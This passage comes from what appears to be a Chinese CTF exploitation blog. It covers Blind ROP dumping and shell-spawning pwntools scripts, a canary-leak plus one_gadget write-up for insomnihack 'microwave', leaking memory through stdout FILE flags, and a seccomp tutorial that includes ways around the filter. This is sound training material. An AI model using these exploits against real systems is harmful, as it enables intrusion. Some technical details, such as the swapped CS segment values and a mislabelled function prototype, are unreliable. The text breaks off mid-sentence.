1\n```\n\n这里实际上找出来的地址并不是puts函数的plt表地址，而是在puts的plt表前面一点的内容，但是这一小段内容不影响栈和rdi寄存器，所以没什么影响。\n\n6.利用puts函数和pop rdi;ret来dump二进制文件：\n\n```\n#注释头\n\ndef dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr):\n    pop_rdi = gadgets_addr + 9 # pop rdi; ret\n    result = \"\"\n    while start_addr < end_addr:\n        #print result.encode('hex')\n        sleep(0.1)\n        payload = \"A\"*buf_size\n        payload += p64(pop_rdi)\n        payload += p64(start_addr)\n        payload += p64(puts_plt)\n        payload += p64(stop_addr)\n        try:\n            sh = remote('127.0.0.1', 10001)\n            sh.recvline()\n            sh.sendline(payload)\n            data = sh.recv(timeout=0.1) \n            #timeout makes sure to recive all bytes\n            if data == \"\\n\":#data = \\x00\n                data = \"\\x00\"\n            elif data[-1] == \"\\n\":\n            #data = xxxxx\\n\\x00,data = \\n\\x00,data = xxxxx\\x00\n                data = data[:-1]\n            log.info(\"leaking: 0x%x --> %s\" % (start_addr,(data or '').encode('hex')))\n            result += data\n            start_addr += len(data)\n            sh.close()\n        except:\n            log.info(\"Can't connect\")\n    return result\n```\n\n由于puts 函数通过 \\x00 进行截断，不会输出\\x00，并且会在每一次输出末尾加上换行符\\x0a ，所以有一些特殊情况需要做一些处理，比如单独的 \\x00 、 \\x0a 等。首先当然是先去掉末尾 puts 自动加上的 \\n ，然后如果 recv 到一个 \\n ，说明内存中是 \\x00 ，如果 recv 到一个 \\n\\n ，说明内存中是\\x0a 。 p.recv(timeout=0.1) 是由于函数本身的设定，如果有 \\n\\n ，它很可能在收到第一个 \\n 时就返回了，加上参数可以让它全部接收完。\n\n7.得到二进制文件后就是常规操作了，利用Dynelf或者LibcSearcher和puts函数找到system函数和binsh实际位置，之后通过pop rdi;ret来为system函数赋参数从而getshell。\n\n```\n#注释头\n\nsh = remote('127.0.0.1', 10001)\nsh.recvuntil('password?\\n')\npayload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(\nstop_gadget)\nsh.sendline(payload)\ndata = sh.recvuntil('\\nWelCome', drop=True)\nputs_addr = u64(data.ljust(8, '\\x00'))\nlibc = LibcSearcher('puts', puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\nsystem_addr = libc_base + libc.dump('system')\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\npayload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(\nsystem_addr) + p64(stop_gadget)\nsh.sendline(payload)\nsh.interactive()\n```\n\n这里的libcSearcher有时候不太好用，查到的libc不符合，或者是不对。还是DynElf好用一些，比较准确，并且由于是puts函数打印，所以可能需要单个字符来判断。但实际上64位条件下的got表中的地址一定是0x00007fxxxxxxxxxx，所以如果是大端情况，那么puts函数一定会截断，接收到的只会是xxxxxxxxxx7f和0a所以其实只要判断到换行符的时候就可以。\n\n```\n#注释头\n\ndef leak(address):\n    data = \"\"\n    c=\"\"\n    up = \"\"\n    payload = 'a' * length + p64(rdi_ret) + p64(address) + p64(puts_plt) + p64(stop_gadget)\n    sh.recvuntil('password?\\n')\n    sh.send(payload)\n    while True:\n        c = p.recv(1)\n        if up == '\\n' and c == \"W\":  \n            data = data[:-1]                     \n            data += \"\\x00\"\n            break\n        else:\n            data += c\n        up = c\n    data=data[:7]#实际有效地址只有6个字符\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n\n\ndynelf = DynELF(leak, elf=ELF(\"./brop\"))\nsystem_addr = dynelf.lookup(\"__libc_system\", \"libc\")\n```\n\n但是DynElf好像不能找binsh字符串，所以如果用这种方法那就还需要泄露read的真实地址，找个能写的地方将binsh写进去再调用，比较麻烦。所以能用libcSearcher可以先用来试试，函数，binsh字符串都能找，比较方便一点。\n\n \n\n参考资料：\n\nhttps://wiki.x10sec.org/pwn/linux/stackoverflow/medium-rop-zh/#brop\n\nctf-all-in-one\n\n \n\n \n","tags":["Blind"],"categories":["PWN","BlindROP"]},{"title":"insomnihack CTF 2016-microwave","url":"/2021/08/19/insomnihack CTF 2016-microwave/","content":"\n1.常规checksec，程序全部开启保护，并且有canary保护，从IDA中汇编代码和伪代码也可以看到：\n\n(1)汇编代码：\n\n①生成canary的代码:一般在函数初始化的时候就可以看到\n\n```\n#注释头\n\nmov rax,fs:28h\nmov [rsp+28h+var_20], rax\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523843.png)\n\n②校验:\n\n```\n#注释头\n\nmov rax, [rsp+28h+var_20]\nxor rax, fs:28h\njnz short func\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523812.png)\n\n(2)伪代码：\n\n```\n#注释头\n\nv_canary = __readfsqword(0x28u);\nreturn __readfsqword(0x28u) ^ v_canary;\n```\n\n有很多种形式，如下也是一种：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523399.png)\n\n2.之后查找漏洞，找到两个漏洞：\n\n(1)功能1的sub_F00函数中的printf存在格式化字符串漏洞：\n\n```\n#注释头\n\n__printf_chk(1LL, a1);\n```\n\n这里的1LL不知道是个什么意思，但是实际效果仍然相当于是printf(a1)，调试中可以知道。\n\n(2)功能2的sub_1000存在栈溢出漏洞：\n\n```\n#注释头\n\n__int64 v1; // [rsp+0h] [rbp-418h]\n------------------------------------------------------\nread(0, &v1, 0x800uLL);\n```\n\n3.现在是保护全开，栈溢出漏洞因为canary的关系没办法利用，唯一能利用的只有一个printf()函数，而且还没办法劫持got表，没办法进行完全栈操控。所以这里就想能不能通过printf函数泄露canary从而使得栈溢出这个漏洞派上用场。\n\n4.首先调试，观察canary在栈上的偏移位置，调试断点下在sub_F00函数的printf函数上，因为这个sub_F00函数中也有canary的保护，那么该函数栈上一定存在canary的值。自己调试如下图：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523613.png)\n\nIDA调试界面点击对应生成canary的代码mov  [rsp+28h+var_20], rax中的[rsp+28h+var_20]就可以知道canary的位置应该是rsp+8h处，这里也可以看出来V6就是canary\n\n另外由于这是64位程序，取参顺序是rdi, rsi, rdx, rcx, r8, r9, 栈，由于printf()前两个参数位rdi,rsi对应的是fd和&buf，\n\n这里的buf就是我们输入的username，因为username的输入保存在堆上main函数中有声明：\n\n```\n#注释头\n\nvoid *v4; // r12\n----------------------------------------------------------------\nv4 = malloc(0x3EuLL);\n-------------------------------------------------------------------\nfwrite(\" username: \", 1uLL, 0x15uLL, stdout);\nfflush(0LL);\nfgets((char *)v4, 40, stdin);\n--------------------------------------------------------------------\nfwrite(\" password: \", 1uLL, 0x15uLL, stdout);\nfflush(0LL);\nv3 = 20LL;\nfgets((char *)v4 + 40, 20, stdin);\n------------------------------------------------------------------------\nsub_F00((__int64)v4);\n--------------------------------------------------------------------\nunsigned __int64 __fastcall sub_F00(__int64 a1)\n-------------------------------------------------------------------\n__printf_chk(1LL, a1);\n```\n\n下图是没有打印之前的内容：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191523728.png)\n\n我们可以看到rsi的值是5开头的，这其实就是一个堆内存地址，调试过程中输入跳转就可以看到该地址对应的内容就是我们的输入username的值。那么输入username时输入多个%p，触发格式化字符串漏洞，打印寄存器和栈上的内容，泄露出libc地址和canary。printf()依次根据%p打印的参数顺序是rdx,rcx,r8,r9,栈。所以r9之后第一个打印出来的数据是rsp-8h，也就是canary的值，这样就可以得到泄露的canary的值，从而控制栈溢出。同时我们可以发现打印出来的数据中包含libc中的函数，这样同时也泄露出来了libc加载后的地址，之后通过偏移计算出基地址。\n\n5.之后进行栈溢出操控，但是这里如果连不上账户会没办法使用sub_1000函数，用IDA查看可以看到在sub_f00函数中对密码进行检查，可直接查看到密码：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191522910.png)\n\n这个off_204010就是密码，点进去就可以看到。\n\n由之前步骤可以得到canary和libc基地址。查询之后可以发现由于retn前会检查canary，对应汇编代码是：\n\nxor rax, fs:28h\n\n那么如果canary输入成功，xor之后会使得rax一定为0，满足该libc库的Onegadget条件，所以这里可以直接使用Onegadget：\n\n```\n#注释头\n\npayload = \"A\"*1032 #padding\npayload += p64(canary) #正确的canary\npayload += \"B\"*8 #padding\npayload += p64(one_gadget_addr) #one gadget RCE\nio.sendline('2') #使用有栈溢出的功能2\nio.recvuntil('#> ')\nio.sendline(payload)\n```\n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["canary"],"categories":["PWN","canary绕过0x9"]},{"title":"利用IO_FILE泄露地址","url":"/2021/08/19/利用IO_FILE泄露地址/","content":"\nIO_FILE的具体结构和功能在FSOP中写过，这里主要关注下其中的打印函数_IO_2_1_stdout的相关利用，通常用来在堆利用时，由于没有show之类的打印堆块内容的选项，导致无法泄露libc地址的情况。\n\n# 前言\n\n这里的_flags在_IO_2_1_stdout结构体中，一旦我们想要通过_IO_2_1_stdout来打印指定内存地址的内容，就需要对_flags的值进行设置，绕过一些检查，才能最终进入_IO_SYSWRITE函数打印。\n\n## 1._IO_new_file_overflow检查：\n\n### 条件一\n\n不能进入，判断语句需要为假，否则直接返回EOF了。\n\n```\n#注释头\n\nif (f->_flags & _IO_NO_WRITES)   /* SET ERROR */\n{\n    f->_flags |= _IO_ERR_SEEN;\n    __set_errno (EBADF);\n    return EOF;\n}\n```\n\n需要满足条件：f->_flags & _IO_NO_WRITES == false\n\n### 条件二\n\n不能进入，判断语句需要为假\n\n```\n#注释头\n\nif ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n```\n\n因为这里一旦进入，就会有一个初始化指针的操作，导致我们的_IO_write_base被覆盖，从而无法输出想要的地址的内容。\n\n需要满足条件：((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) == false\n\n之后就跳到如下语句：\n\n```\n#注释头\n\nif (ch == EOF)\n    return _IO_do_write (f, f->_IO_write_base,f->_IO_write_ptr - f->_IO_write_base);\n```\n\n进入_IO_do_write函数。\n\n## 2._IO_do_write检查：\n\n▲由于如下定义：libc_hidden_ver (_IO_new_do_write, _IO_do_write)，该函数成了_IO_new_do_write函数，定义如下：\n\n```\n#注释头\n\n_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)\n{\n    return (to_do == 0\n        || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;\n}\n```\n\n这个函数中没什么操作，直接进入到new_do_write函数.\n\n## 3.new_do_write检查：\n\n```\n#注释头\n\nif (fp->_flags & _IO_IS_APPENDING)\nelse if (fp->_IO_read_end != fp->_IO_write_base)\n```\n\n这里其实不太明白，很多地方说要满足其中一个才能进入到实际调用打印的系统函数：\n\n```\n#注释头\n\ncount = _IO_SYSWRITE (fp, data, to_do);\n```\n\n但是我认为if和else if都绕过应该也可以运行到count的执行语句，不知道是不是因为需要设置fp->_offset才能打印，那如果是的话，控制_IO_2_1_stdout的结构体不也能设置fp->_offset的值吗。\n\n### (1)针对if (fp->_flags & _IO_IS_APPENDING)：\n\n这个可以进入，影响不大\n\n```\n#注释头\n\nif (fp->_flags & _IO_IS_APPENDING)\n     fp->_offset = _IO_pos_BAD;\n```\n\n### (2)针对else if (fp->_IO_read_end != fp->_IO_write_base)\n\n这个不太能够进入，因为该语句如下：\n\n```\nelse if (fp->_IO_read_end != fp->_IO_write_base)\n{\n    _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);\n    if (new_pos == _IO_pos_BAD)\n        return 0;\n    fp->_offset = new_pos;\n}\n```\n\n因为_IO_SYSSEEK可能会执行错误，崩溃，无法到达count的执行语句。而且fp->_IO_read_end != fp->_IO_write_base判断语句满足的概率相当大，这就导致如果第一个if不进入，那么第二个else if就有很大概率进入，然后就可能会崩溃。所以在只能设置flags值的情况下还是进入第一个If语句是最好的选择。\n\n所以需要满足条件：fp->_flags & _IO_IS_APPENDING == true\n\n▲后面才想明白是因为如果只设置flags的话，而_IO_read_end和_IO_write_base的值无法控制的情况下，最好使程序流进去if (fp->_flags & _IO_IS_APPENDING)语句，而不要使程序流进入else if语句。\n\n## 4.综上三个条件：\n\n```\n#注释头\n\nf->_flags & _IO_NO_WRITES == FALSE\n((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) == FALSE\nfp->_flags & _IO_IS_APPENDING == TRUE\n```\n\n再加上flags值的相关宏定义：\n\n```\n#注释头\n\n//高16位\n#define _IO_MAGIC 0xFBAD0000 /* Magic number */\n#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */\n#define _IO_MAGIC_MASK 0xFFFF0000\n\n//低16位\n-------------------------------------------------------------------\n#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */\n#define _IO_UNBUFFERED 2\n#define _IO_NO_READS 4 /* Reading not allowed */\n#define _IO_NO_WRITES 8 /* Writing not allowd */\n#define _IO_EOF_SEEN 0x10\n#define _IO_ERR_SEEN 0x20\n#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */\n#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/\n#define _IO_IN_BACKUP 0x100\n#define _IO_LINE_BUF 0x200\n#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */\n#define _IO_CURRENTLY_PUTTING 0x800\n#define _IO_IS_APPENDING 0x1000\n#define _IO_IS_FILEBUF 0x2000\n#define _IO_BAD_SEEN 0x4000\n#define _IO_USER_LOCK 0x8000\n```\n\nflags的高16位为_IO_MAGIC，基本固定，由libc确定，不同版本可能有差异。后面低16位分别对应不同的表示。\n\n可得最终的flags应该为0xFBAD1800，其实也不一定非得是这个值，只要满足以上所列的条件即可：\n\nf->flag & 0xa00 and f->flag & 0x1000 == 1以及f->write_base != f->write_ptr\n\n最后设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的位置即可。\n\n▲这里需要注意的是_IO_CURRENTLY_PUTTING标志位在程序已经有打印过东西的情况下就已经是1了，没有打印过则为0。\n\n \n\n \n","tags":["pwn-Skill"],"categories":["PWN"]},{"title":"Seccomp_Before","url":"/2021/08/19/Seccomp_Before/","content":"\n1.常见Seccomp：\n\n(1)库安装：\n\n```\n#注释头\n\napt install libseccomp-dev libseccomp2 seccomp\n```\n\n(2)正常的使用seccopm开启：\n\n①先创建初始化scmp_filter_ctx结构体，并且给定初始规则：\n\nscmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);\n\n这里将初始规则设置为SCMP_ACT_ALLOW，即允许所有的系统调用。另有规则如下：\n\n```\n#注释头\n\n/**\n* Kill the process\n*/\n#define SCMP_ACT_KILL_PROCESS 0x80000000U\n/**\n* Kill the thread\n*/\n#define SCMP_ACT_KILL_THREAD 0x00000000U\n/**\n* Kill the thread, defined for backward compatibility\n*/\n#define SCMP_ACT_KILL SCMP_ACT_KILL_THREAD\n/**\n* Throw a SIGSYS signal\n*/\n#define SCMP_ACT_TRAP 0x00030000U\n/**\n* Notifies userspace\n*/\n#define SCMP_ACT_NOTIFY 0x7fc00000U\n/**\n* Return the specified error code\n*/\n#define SCMP_ACT_ERRNO(x) (0x00050000U | ((x) & 0x0000ffffU))\n/**\n* Notify a tracing process with the specified value\n*/\n#define SCMP_ACT_TRACE(x) (0x7ff00000U | ((x) & 0x0000ffffU))\n/**\n* Allow the syscall to be executed after the action has been logged\n*/\n#define SCMP_ACT_LOG 0x7ffc0000U\n/**\n* Allow the syscall to be executed\n*/\n#define SCMP_ACT_ALLOW 0x7fff0000U\n\n/* SECCOMP_RET_USER_NOTIF was added in kernel v5.0. */\n#ifndef SECCOMP_RET_USER_NOTIF\n#define SECCOMP_RET_USER_NOTIF 0x7fc00000U\n```\n\n②添加规则，即添加白名单或者黑名单：\n\nseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);\n\n这里将系统调用execve给禁止了。函数原型：\n\n```\n#注释头\n\n/**\n* Add a new rule to the filter\n* @param ctx the filter context\n* @param action the filter action\n* @param syscall the syscall number\n* @param arg_cnt the number of argument filters in the argument filter chain\n* @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended)\n*\n* This function adds a series of new argument/value checks to the seccomp\n* filter for the given syscall; multiple argument/value checks can be\n* specified and they will be chained together (AND'd together) in the filter.\n* If the specified rule needs to be adjusted due to architecture specifics it\n* will be adjusted without notification. Returns zero on success, negative\n* values on failure.\n*\n*/\nint seccomp_rule_add(scmp_filter_ctx ctx,\nuint32_t action, int syscall, unsigned int arg_cnt, ...);\n```\n\n即(结构体，规则，规则生效的系统调用，arg_cnt，scmp_arg_cmp)。\n\nA.其中arg_cnt表示函数seccomp_rule_add后面传入参数的个数，如果为0，则直接禁止execve，后面的scmp_arg_cmp都不用赋值，赋值了也没用。\n\nB.如果不为0，则再看之后seccomp_rule_add函数之后传入的参数，赋值为1，则只允许一条规则。赋值为2，则需同时满足之后的两条规则才会生效。例如：\n\n```\n#注释头\n\n//从0开始计算参数个数\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),1,\n        SCMP_A2(SCMP_CMP_EQ,0x10));\nwrite(1,\"1234567812345678\",0x10);//被拦截\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10));\nwrite(1,\"1234567812345678\",0x10);//不被拦截\n//seccomp_rule_add参数个数设置为2，但是后续没有添加规则，则默认不满足，则不会生效\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));\nwrite(1,\"1234567812345678\",0x10);//被拦截\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));\nwrite(1,\"1234567812345678\",0x10);//不被拦截\n```\n\n但是使用seccomp，一旦被拦截，则程序直接打印错误信息并中断，无法执行之后的代码，规则如下：\n\n```\n#注释头\n\n/**\n* Specify an argument comparison struct for use in declaring rules\n* @param arg the argument number, starting at 0\n* @param op the comparison operator, e.g. SCMP_CMP_*\n* @param datum_a dependent on comparison\n* @param datum_b dependent on comparison, optional\n*/\n#define SCMP_CMP(...) ((struct scmp_arg_cmp){__VA_ARGS__})\n\n/**\n* Specify an argument comparison struct for argument 0\n*/\n#define SCMP_A0(...) SCMP_CMP(0, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 1\n*/\n#define SCMP_A1(...) SCMP_CMP(1, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 2\n*/\n#define SCMP_A2(...) SCMP_CMP(2, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 3\n*/\n#define SCMP_A3(...) SCMP_CMP(3, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 4\n*/\n#define SCMP_A4(...) SCMP_CMP(4, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 5\n*/\n#define SCMP_A5(...) SCMP_CMP(5, __VA_ARGS__)\n\n/**\n* Comparison operators\n*/\nenum scmp_compare {\n_SCMP_CMP_MIN = 0,\nSCMP_CMP_NE = 1, /**< not equal */\nSCMP_CMP_LT = 2, /**< less than */\nSCMP_CMP_LE = 3, /**< less than or equal */\nSCMP_CMP_EQ = 4, /**< equal */\nSCMP_CMP_GE = 5, /**< greater than or equal */\nSCMP_CMP_GT = 6, /**< greater than */\nSCMP_CMP_MASKED_EQ = 7, /**< masked equality */\n_SCMP_CMP_MAX,\n};\n\n/**\n* Argument datum\n*/\ntypedef uint64_t scmp_datum_t;\n\n/**\n* Argument / Value comparison definition\n*/\nstruct scmp_arg_cmp {\nunsigned int arg; /**< argument number, starting at 0 */\nenum scmp_compare op; /**< the comparison op, e.g. SCMP_CMP_* */\nscmp_datum_t datum_a;\nscmp_datum_t datum_b;\n};\n```\n\n③启用seccomp保护：\n\nseccomp_load(ctx);\n\n利用seccomp_load函数加载启用保护。函数原型：\n\n```\n#注释头\n\n/**\n* Return the notification fd from a filter that has already been loaded\n* @param ctx the filter context\n*\n* This returns the listener fd that was generated when the seccomp policy was\n* loaded. This is only valid after seccomp_load() with a filter that makes\n* use of SCMP_ACT_NOTIFY.\n*\n*/\nint seccomp_notify_fd(const scmp_filter_ctx ctx);\n```\n\n这里传入scmp_filter结构体即可，如果不传入\n\n以上的均可在seccomp.h中查看。\n\n▲总的调用就是：\n\n```\n#注释头\n\nscmp_filter_ctx ctx;\nctx = seccomp_init(SCMP_ACT_ALLOW);\nseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);\nseccomp_load(ctx);\n```\n\n记得引用库：\n\n```\n#注释头\n\n#include <seccomp.h>\n#include <linux/seccomp.h>\n```\n\n \n\n2.Prtctl函数(/usr/includ/linux/prctl.h)：\n\n原型：\n\n```\n#注释头\n\nint prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);\n```\n\n这里的参数可以不需要全部设置上，其中option比较关键，在PWN中大致分以下情况：\n\n(1)若option为PR_SET_NO_NEW_PRIVS(38)：\n\n此时将第二个参数arg2设置为1，那么程序的子线程就无法通过execve来提权，就是pwn kernel中即使改掉了cred结构体，使其特权为0，再执行system(\"/bin/sh\")依然无法提权。即prctl(38, 1,0,0,0)表示禁用系统调用，也就是system和onegadget都没了，同时子进程也无法这样来获得shell。\n\n(2)若option为PR_SET_SECCOMP(22)：\n\n此时可以通过参数来设置规则，道理和seccomp一样的，规则如下：\n\n①如果arg2为SECCOMP_MODE_STRICT(1),则只允许调用read,write,_exit(这个exit不是退出程序的意思),sigreturn这几个syscall。即prctl(22,1,0,0,0)。\n\n②如果arg2为SECCOMP_MODE_FILTER(2),则为过滤模式,其中对syscall的限制通过参数3的结构体，来自定义过滤规则，函数会重定向到另一个同名函数，该函数的原型如下：\n\n```\n#注释头\n\nint prctl(int PR_SET_SECCOMP,const struct* sock_filter SECCOMP_MODE_FILTER,const sock_fprog prog);\n```\n\n但调用之前还是需要禁用execve，即调用形式为：\n\n```\n#注释头\n\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);   //这里是需要这么写的\nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&sfp);\n```\n\nA.参数SECCOMP_MODE_FILTER是一个结构体数组，该sock_filter结构体为：\n\n```\n#注释头\n\nstruct sock_filter { /* Filter block */\n__u16 code; /* Actual filter code */\n__u8 jt; /* Jump true */\n__u8 jf; /* Jump false */\n__u32 k; /* Generic multiuse field */\n};\n```\n\na.code:一个字节，详细定义操作的类型，假设code为0x15\n\n先看前四位：\n\n```\n#注释头\n\n#define BPF_CLASS(code)\n#define BPF_LD 0x00 \n#define BPF_LDX 0x01\n#define BPF_ST 0x02\n#define BPF_STX 0x03\n#define BPF_ALU 0x04\n#define BPF_JMP 0x05\n#define BPF_RET 0x06\n#define BPF_MISC 0x07\n```\n\n这里前四位就是0x5，所以对应到之后的四位定义域中去：\n\n```\n#注释头\n\n/*jmp fields */\n#define BPF_JA 0x00 \n#define BPF_JEQ 0x10\n#define BPF_JGT 0x20\n#define BPF_JGE 0x30\n#define BPF_JSET 0x40\n#define BPF_SRC(code) ((code) & 0x08)\n```\n\n那么这个0x15的操作就是BPF_JMP+BPF_JEQ。\n\n▲同理，ld、ldx、ALU都有对应的定义域：\n\n```\n#注释头\n\n/*ld fields */\n#define BPF_W 0x00\n#define BPF_H 0x08\n#define BPF_B 0x10\n\n/*ldx fields */  \n#define BPF_IMM 0x00\n#define BPF_ABS 0x20\n#define BPF_IND 0x40\n#define BPF_MEM 0x60\n#define BPF_LEN 0x80\n#define BPF_MSH 0xa0\n\n/*alu fields */\n#define BPF_ADD 0x00\n#define BPF_SUB 0x10\n#define BPF_MUL 0x20\n#define BPF_DIV 0x30\n#define BPF_OR 0x40\n#define BPF_AND 0x50\n#define BPF_LSH 0x60\n#define BPF_RSH 0x70\n#define BPF_NEG 0x80\n#define BPF_MOD 0x90\n#define BPF_XOR 0xa0\n\n/*常数*/\n#define BPF_K 0x00\n#define BPF_X 0x08\n```\n\n而RET一般对应BPF_K，然后在之后参数上写SECCOMP_RET_KILL或者SECCOMP_RET_ALLOW。MISC倒是没见过。\n\nb.JT和JF：是相对于当前语句的偏移。例如(1,0)，假设当前语句为0003，则代表之前语句为真，则跳转到0005，为假则跳转到0004。所以如果都是0，相当于是个无跳转语句，如果都是1，相当于是跳过下一条语句。\n\nc.K：可以当作一个参数。如果操作语句是比较，那么就相当于比较的右值A>=K？。以此类推。这个参数的值是从seccomp_data中：\n\n```\n#注释头\n\n(<linux/audit.h> ) \nstruct seccomp_data {\nint nr; /* System call number */\n__u32 arch; /* AUDIT_ARCH_* value*/\n__u64 instruction_pointer; /* CPU instruction pointer */\n__u64 args[6]; /* Up to 6 system call arguments */\n};\n```\n\n值即代表偏移，偏移字长为一个字节：\n\nK==0，代表nr；K==4，代表arch；K==8，代表args[0]。而args六个值相当于传参寄存器的值：ebx,ecx,edx,esi,edi,ebp(32位)，rdi,rsi,rdx,r10,r8,r9(64位)\n\n▲所以(0x15,0x00,0x01,0x0000003b)就代表if (A!= execve) goto offset_1。这里也可以用一个简单的操作来替代：BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1)。定义规则就可以如下：\n\n```\n#注释头\n\nstruct sock_filter sfi[] = {\n{0x20,0x00,0x00,0x00000000},\n{0x15,0x00,0x01,0xc000003b},\n{0x06,0x00,0x00,0x00000000},   //KILL\n{0x06,0x00,0x00,0x7fff0000}   //ALLOW\n};\n```\n\n或者\n\n```\n#注释头\n\nstruct sock_filter filter[] = {\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), \nBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), \nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), \nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), \n};\n```\n\n由于在/usr/include/linux/bpf_common.h有宏定义，所以第二种情况也是可以的。\n\nB.sfp也是一个结构体：\n\n```\n#注释头\n\nstruct sock_fprog { /* Required for SO_ATTACH_FILTER. */\nunsigned short len; /* Number of filter blocks */\nstruct sock_filter *filter;\n};\n```\n\na.len即代表语句条数，比如上面的就是4;\n\nb.filter就是指向上面SECCOMP_MODE_FILTER这个结构体的指针。\n\n▲所以完整的就是：\n\n```\n#注释头\n\nstruct sock_filter sfi[] = {\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),\nBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),\n};\nstruct sock_fprog sfp = {\n(unsigned short)(sizeof(filter)/sizeof(filter[0])),\nsfi,\n};\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); \nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);\n```\n\n这样设置后，出来的效果如下：\n\n```\n#注释头\n\nroot@241adce81c0a:/ctf/seccomp# seccomp-tools dump ./prctl_test2\nline  CODE JT   JF   K\n=================================\n0000: 0x20 0x00 0x00 0x00000000 A = sys_number\n0001: 0x15 0x00 0x01 0x0000003b if (A != execve) goto 0003\n0002: 0x06 0x00 0x00 0x00000000 return KILL\n0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n```\n\n \n\n3.简单的seccomp规则写：\n\n(1)依据简单语法写规则：\n\n```\n#注释头\n\nA = sys_number\nA == 257? e0:next\nA == 1? ok:next\nreturn ALLOW\ne0:\nreturn ERRNO(0)\nok:\nreturn ALLOW\n```\n\n保存为seccomp_asm\n\n(2)利用seccomp-tools来生成：\n\nseccomp-tools asm seccomp_asm -f raw|seccomp-tools disasm -\n\n```\n#注释头\n\nline  CODE JT   JF   K\n=================================\n0000: 0x20 0x00 0x00 0x00000000 A = sys_number\n0001: 0x15 0x02 0x00 0x00000101 if (A == openat) goto 0004\n0002: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0005\n0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0004: 0x06 0x00 0x00 0x00050000 return ERRNO(0)\n0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n```\n\n这样就可以方便写规则了，同样有个seccomp_bpf.h的东西，比较简单：\n\n[secfilter/seccomp-bpf.h at master · ahupowerdns/secfilter · GitHub](https://github.com/ahupowerdns/secfilter/blob/master/seccomp-bpf.h)\n\n \n\n4.常见种类及绕过方式：\n\n(1)禁用execve函数时，但是需要getshell才行，此时存在满足一定条件可以使用shellcode：\n\n①未检查arch：\n\n尝试使用shellcode将处理器转换，如果是x64则转为i386，同理类似。这样系统调用号11就不会被解析为64位中的__x64_sys_munmap，而是32位中的sys_execve，绕过检查。\n\n```\n#注释头\n\nto32:\nmov DWORD [rsp+4],0x23;\nretf;\n\nto64:\nmov DWORD [esp+4],0x33; \nretf;\n```\n\n由于retf的指令实际效果为：POP CS:EIP，这里CS为0x23即为64位，0x33即为32位，所以如果能找到控制栈的gadget那其实也可以直接用retf，毕竟retf其实也挺常见的。同时还有其他的好用ret指令：\n\n```\n#注释头\n\nRETQ：POP RIP\nRETN: POP EIP\nRETF: POP CS:EIP\n```\n\n参考SCTF2020里面的CoolCode\n\n②存在检查漏洞：if (A < 0x40000000)，如果对A >= 